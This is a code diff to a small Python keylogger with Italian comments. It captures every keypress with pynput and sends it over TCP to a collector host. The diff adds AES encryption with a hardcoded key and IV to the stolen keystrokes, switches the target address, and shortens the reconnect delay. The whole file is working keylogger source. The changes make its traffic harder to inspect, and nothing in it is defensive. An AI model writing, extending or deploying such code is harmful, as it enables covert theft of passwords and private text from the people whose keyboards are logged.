@@ -3,6 +3,14 @@ import socket
 from pynput.keyboard import Listener #Libreria per leggere i caratteri digitati sulla tastiera
 import time
 
+from Crypto.Cipher import AES
+
+def do_encrypt(message: str):
+    obj = AES.new(b'Fm!t%68Hava!wq&)', AES.MODE_CFB, b'Fh78&rsV2!894R6$')
+    ciphertext = obj.encrypt(message.encode())
+    return ciphertext
+
+
 connected = False 
 while not connected:
     # Crea il socket "stream based" basato sul protocollo TCP ed indirizzi IPv4
@@ -12,13 +20,14 @@ while not connected:
     print("> Connessione... ")  
 
     try:  
-        clientSocket.connect(("10.0.2.2",9090))
+        #clientSocket.connect(("10.0.2.2",9090))
+        clientSocket.connect(("127.0.0.1",9090))
         connected = True  
         print( "> Connessione eseguita" )
 
         # Funzione che si occupa di inviare il carattere digitato.
         def on_press(key):
-            clientSocket.send(str(key).encode())
+            clientSocket.send(do_encrypt(str(key)))
 
         # Creo un istanza di un listener che registra tutte le pressioni dei tasti.
         # Il costruttore prende la funzione creata e usa il metodo join per joinare l'istanza nel thread principale.
@@ -32,4 +41,4 @@ while not connected:
 
     except socket.error:  
         print("  >> Connessione fallita")
-        time.sleep(30)
+        time.sleep(15)
